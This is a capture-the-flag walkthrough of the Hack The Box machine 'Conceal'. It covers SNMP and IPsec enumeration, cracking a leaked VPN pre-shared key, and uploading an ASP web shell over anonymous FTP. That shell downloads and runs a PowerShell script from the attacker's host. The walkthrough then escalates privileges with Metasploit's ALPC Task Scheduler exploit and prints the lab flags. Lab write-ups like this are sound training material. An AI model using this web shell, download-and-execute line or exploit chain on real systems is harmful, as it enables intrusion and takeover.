# Conceal
>Author : Xyan1d3
>Date : 10th July 2021
>IP : 10.10.10.116
>OS : Windows
>Difficulty : Medium
# Initial Enumeration
## Nmap TCP
**Nmap on TCP ports reveals that it has no ports open.**
## Nmap TCP Allports
**Nmap on TCP ports reveals that it has no ports open.**
## Nmap UDP
```sql
# Nmap 7.91 scan initiated Sat Jul 10 12:49:49 2021 as: nmap -sU -v -oN nmap/conceal-udp 10.10.10.116
Nmap scan report for 10.10.10.116
Host is up (0.069s latency).
Not shown: 999 open|filtered ports
PORT    STATE SERVICE
500/udp open  isakmp

Read data files from: /usr/bin/../share/nmap
# Nmap done at Sat Jul 10 12:50:50 2021 -- 1 IP address (1 host up) scanned in 60.53 seconds
```

It reveals that port `500/udp` is open and it is used by `IPSEC VPN`.

We have to enumerate the `500/udp` which we could enumerate using `ike-scan`.

## IPSEC VPN Enumeration
We could try to do an snmp enumeration using `snmp-check` command.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.18]─[~/htb/conceal]
└──╼ # snmp-check 10.10.10.116
snmp-check v1.9 - SNMP enumerator
Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)

[+] Try to connect to 10.10.10.116:161 using SNMPv1 and community 'public'

[*] System information:

  Host IP address               : 10.10.10.116
  Hostname                      : Conceal
  Description                   : Hardware: AMD64 Family 23 Model 49 Stepping 0 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 15063 Multiprocessor Free)
  Contact                       : IKE VPN password PSK - 9C8B1A372B1878851BE2C097031B6E43
  Location                      : -
  Uptime snmp                   : 03:57:30.20
  Uptime system                 : 03:57:16.97
  System date                   : 2021-7-10 11:45:10.4
  Domain                        : WORKGROUP

[*] User accounts:

  Guest
  Destitute
  Administrator
  DefaultAccount

*** SNIP ***

[*] Network IP:

  Id                    IP Address            Netmask               Broadcast
  12                    10.10.10.116          255.255.255.0         1
  1                     127.0.0.1             255.0.0.0             1

[*] Routing information:

  Destination           Next hop              Mask                  Metric
  0.0.0.0               10.10.10.2            0.0.0.0               271
  10.10.10.0            10.10.10.116          255.255.255.0         271
  10.10.10.116          10.10.10.116          255.255.255.255       271
  10.10.10.255          10.10.10.116          255.255.255.255       271
  127.0.0.0             127.0.0.1             255.0.0.0             331
  127.0.0.1             127.0.0.1             255.255.255.255       331
  127.255.255.255       127.0.0.1             255.255.255.255       331
  224.0.0.0             127.0.0.1             240.0.0.0             331
  255.255.255.255       127.0.0.1             255.255.255.255       331

[*] TCP connections and listening ports:

  Local address         Local port            Remote address        Remote port           State
  0.0.0.0               21                    0.0.0.0               0                     listen
  0.0.0.0               80                    0.0.0.0               0                     listen
  0.0.0.0               135                   0.0.0.0               0                     listen
  0.0.0.0               445                   0.0.0.0               0                     listen
  0.0.0.0               49664                 0.0.0.0               0                     listen
  0.0.0.0               49665                 0.0.0.0               0                     listen
  0.0.0.0               49666                 0.0.0.0               0                     listen
  0.0.0.0               49667                 0.0.0.0               0                     listen
  0.0.0.0               49668                 0.0.0.0               0                     listen
  0.0.0.0               49669                 0.0.0.0               0                     listen
  0.0.0.0               49670                 0.0.0.0               0                     listen
  10.10.10.116          139                   0.0.0.0               0                     listen

[*] Listening UDP ports:

  Local address         Local port
  0.0.0.0               123
  0.0.0.0               161
  0.0.0.0               500
  0.0.0.0               4500
  0.0.0.0               5050
  0.0.0.0               5353
  0.0.0.0               5355
  0.0.0.0               63644
  10.10.10.116          137
  10.10.10.116          138
  10.10.10.116          1900
  10.10.10.116          64993
  127.0.0.1             1900
  127.0.0.1             64994
```

We have the IKE VPN password PSK Hash : `9C8B1A372B1878851BE2C097031B6E43`
![[Pasted image 20210710171702.png]]
It turns out that it is an `NTLM` hash and it translates to `Dudecake1!`.

```python
┌─[Magisk@Xyan1d3]─[10.10.14.18]─[~/htb/conceal]
└──╼ # ike-scan -M --showbackoff 10.10.10.116
Starting ike-scan 1.9.4 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.10.116    Main Mode Handshake returned
        HDR=(CKY-R=8c1579e875ff8c9d)
        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration(4)=0x00007080)
        VID=1e2b516905991c7d7c96fcbfb587e46100000009 (Windows-8)
        VID=4a131c81070358455c5728f20e95452f (RFC 3947 NAT-T)
        VID=90cb80913ebb696e086381b5ec427b1f (draft-ietf-ipsec-nat-t-ike-02\n)
        VID=4048b7d56ebce88525e7de7f00d6c2d3 (IKE Fragmentation)
        VID=fb1de3cdf341b7ea16b7e5be0855f120 (MS-Negotiation Discovery Capable)
        VID=e3a5966a76379fe707228231e5ce8652 (IKE CGA version 1)

IKE Backoff Patterns:

IP Address      No.     Recv time               Delta Time
10.10.10.116    1       1625901944.968092       0.000000
10.10.10.116    Implementation guess: Linksys Etherfast

Ending ike-scan 1.9.4: 1 hosts scanned in 60.164 seconds (0.02 hosts/sec).  1 returned handshake; 0 returned notify
```

- Encryption : `3DES`
- Hash : `SHA1`
- Group2 : `modp1024`
- Auth : `PSK`
- IKE Duration : `28800s`
- PSK Password : `Dudecake1!`

We could now use `strongswan` inorder to establish a connection as a `VPN`.

We have to edit the file `/etc/ipsec.conf` wich this configuration.
```python
# ipsec.conf - strongSwan IPsec configuration file

# basic configuration
config setup
    charondebug="all"
    uniqueids=yes
    strictcrlpolicy=no

conn conceal
        type=transport
        auto=start
        keyexchange=ikev1
        authby=psk
        left=10.10.14.18
        leftprotoport=tcp
        right=10.10.10.116
        rightprotoport=tcp
        ike=3des-sha1-modp1024
        esp=3des-sha1
        ikelifetime=28800s
        lifetime=3600s
```

And, We have to also edit the `/etc/ipsec.secrets`.
```python
# This file holds shared secrets or RSA private keys for authentication.

# RSA private key for this host, authenticating it to any other host
# which knows the public part.

%any : PSK "Dudecake1!"

include ipsec.d/ipsec.nm-l2tp.secrets
```

Now, We could connect to the box using the `ipsec restart --no-fork`
```python
┌─[Magisk@Xyan1d3]─[10.10.14.18]─[~/htb/conceal]                   
└──╼ # ipsec restart --nofork                                                       
Stopping strongSwan IPsec failed: starter is not running                      
Starting strongSwan 5.9.1 IPsec [starter]...

*** SNIP ***

12[CFG] selected proposal: ESP:3DES_CBC/HMAC_SHA1_96/NO_EXT_SEQ
12[IKE] CHILD_SA conceal{1} established with SPIs c48bef0a_i f1c51912_o and TS 10.10.14.18/32[tcp] === 10.10.10.116/32[tcp]
12[ENC] generating QUICK_MODE request 3399847486 [ HASH ]
12[NET] sending packet: from 10.10.14.18[500] to 10.10.10.116[500] (60 bytes)
13[NET] received packet: from 10.10.10.116[500] to 10.10.14.18[500] (76 bytes)
13[ENC] parsed QUICK_MODE response 3399847486 [ HASH N(INIT_CONTACT) ]
13[IKE] ignoring fourth Quick Mode message
```

We are now successfully connected to the box with `IPSec` VPN and can now nmap the `TCP` ports of the box with `-sT` with a Tcp Connect Scan.

## Nmap TCP connect scan over IPSec VPN
```sql
# Nmap 7.91 scan initiated Sat Jul 10 21:07:31 2021 as: nmap -sT -A -p21,80,135,139,445 -v -oN nmap/conceal-ipsec-tcp-deep 10.10.10.116
Nmap scan report for 10.10.10.116
Host is up (0.075s latency).

PORT    STATE SERVICE       VERSION
21/tcp  open  ftp           Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp  open  http          Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-07-10T15:38:00
|_  start_date: 2021-07-10T06:47:53

TRACEROUTE (using proto 1/icmp)
HOP RTT      ADDRESS
1   72.27 ms 10.10.14.1
2   75.38 ms 10.10.10.116
```

## Crackmapexec
```python
┌─[Magisk@Xyan1d3]─[10.10.14.18]─[~/htb/conceal]
└──╼ # crackmapexec smb 10.10.10.116
SMB         10.10.10.116    445    CONCEAL          [*] Windows 10.0 Build 15063 x64 (name:CONCEAL) (domain:Conceal) (signing:False) (SMBv1:False)
```
We see that the windows build here is `15063`.
Which shows that this is probably running `Windows 10 1703`.

# Inital FootHold
We have an anonymous login enabled on thje ftp port.
Any file uploaded on the FTP is put inside the `http://10.10.10.116/upload`.

So, We may  upload a  malicious asp file and execute it to get a reverse shell on the box.
The malicious asp file uploaded is given : 
```asp
┌─[0z09e]─[10.10.14.18]─[/dev/shm/conceal/www]
└──╼ $ cat rev.asp 
<%
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("powershell.exe -ep bypass IEX(IWR http://10.10.14.18/magisk.ps1 -UseBasicParsing)")
o = cmd.StdOut.Readall()
Response.write(o)
%>
```

![[Pasted image 20210711132403.png]]

## Getting the user Flag
```python
PS C:\Users\Destitute\Desktop> ls


    Directory: C:\Users\Destitute\Desktop


Mode                LastWriteTime         Length Name                                             
----                -------------         ------ ----                                             
-a----       12/10/2018     23:58             32 proof.txt                                        


PS C:\Users\Destitute\Desktop> cat proof.txt
6E9FDFE0DCB66E700FB9CB824AE5A6FF
```

# Root Escalation
We check for the operating system version running here.
```python
PS C:\Users\Destitute\Desktop> systeminfo

Host Name:                 CONCEAL
OS Name:                   Microsoft Windows 10 Enterprise
OS Version:                10.0.15063 N/A Build 15063
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                00329-00000-00003-AA343
Original Install Date:     12/10/2018, 20:04:27
System Boot Time:          11/07/2021, 08:43:44
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-gb;English (United Kingdom)
Input Locale:              en-gb;English (United Kingdom)
Time Zone:                 (UTC+00:00) Dublin, Edinburgh, Lisbon, London
Total Physical Memory:     2,047 MB
Available Physical Memory: 1,166 MB
Virtual Memory: Max Size:  3,199 MB
Virtual Memory: Available: 2,228 MB
Virtual Memory: In Use:    971 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet0 2
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.116
                                 [02]: fe80::2d59:b143:928b:59d9
                                 [03]: dead:beef::4197:3975:9f75:6f1a
                                 [04]: dead:beef::2d59:b143:928b:59d9
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```

We see that we are up against an `Windows 10 Enterprise 1703` unpatched.

Therefore, According to my knowledge this is vulnerable to the Task Scheduler Exploit (ALPC).
Here, I will be cheating ever So, Slightly as because the box sucks in performance and I will be using metasploit to escalate by privileges.

![[Pasted image 20210711134439.png]]

We could now use the `alpc` exploit module from metasploit.

```python
msf6 > search alpc

Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  exploit/windows/local/alpc_taskscheduler  2018-08-27       normal  No     Microsoft Windows ALPC Task Scheduler Local Privilege Elevation


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/local/alpc_taskscheduler

msf6 > use 0
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/local/alpc_taskscheduler) > set lhost tun0
lhost => tun0
msf6 exploit(windows/local/alpc_taskscheduler) > set lport 8888
lport => 8888
msf6 exploit(windows/local/alpc_taskscheduler) > run
```


On running the exploit we get our privileges escalated to `NT Authority/SYSTEM`.

## Getting the root Flag
```python
C:\Windows\system32>cd C:\Users\Administrator\Desktop
cd C:\Users\Administrator\Desktop

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 0DCA-A9F4

 Directory of C:\Users\Administrator\Desktop

17/03/2021  17:01    <DIR>          .
17/03/2021  17:01    <DIR>          ..
12/10/2018  23:57                32 proof.txt
               1 File(s)             32 bytes
               2 Dir(s)   9,723,199,488 bytes free

C:\Users\Administrator\Desktop>type proof.txt
type proof.txt
5737DD2EDC29B5B219BC43E60866BE08
```
